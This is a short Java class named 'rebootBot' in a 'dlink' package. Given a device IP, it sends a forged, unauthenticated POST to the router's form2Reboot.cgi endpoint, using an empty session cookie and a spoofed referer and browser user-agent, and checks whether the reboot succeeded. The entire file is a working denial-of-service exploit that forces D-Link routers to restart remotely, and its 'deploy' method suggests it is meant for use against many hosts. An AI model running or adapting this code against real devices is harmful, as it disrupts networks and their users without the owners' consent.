/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package dlink;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.Instant;
import java.util.Scanner;

/**
 *
 * @author SUMAN
 */
public class rebootBot {
    
    String ip;
    boolean stat;
    
    rebootBot(String a)
    {
        ip=a;
    }
    
    public boolean deploy() {

        try{
        URL url = new URL("http://"+ip+"/form2Reboot.cgi");
        String data="reboot=Reboot&submit.htm?reboot.htm=Send";
        byte[] dataBytes = data.getBytes("UTF-8");

        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Cookie", "SessionID=");
        conn.setRequestProperty("Host", ip);
        conn.setRequestProperty("Referer","http://"+ip+"/reboot.htm");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0");
        conn.setRequestProperty("Content-Length", String.valueOf(dataBytes.length));
        conn.setDoOutput(true);
        OutputStream fout=conn.getOutputStream();
        fout.write(dataBytes);
        fout.close();
        InputStream fin=conn.getInputStream();
        StringBuilder sb=new StringBuilder();
        while(fin.available()>0)
            sb.append((char)fin.read());
        fin.close();
        
        if(sb.toString().contains("You clicked reboot button! System is rebooting now..."))
            stat=true;
        else
            stat=false;
       
        }catch(Exception e){
           e.printStackTrace();
           stat=false;
        }
    return stat;
    }
    
}
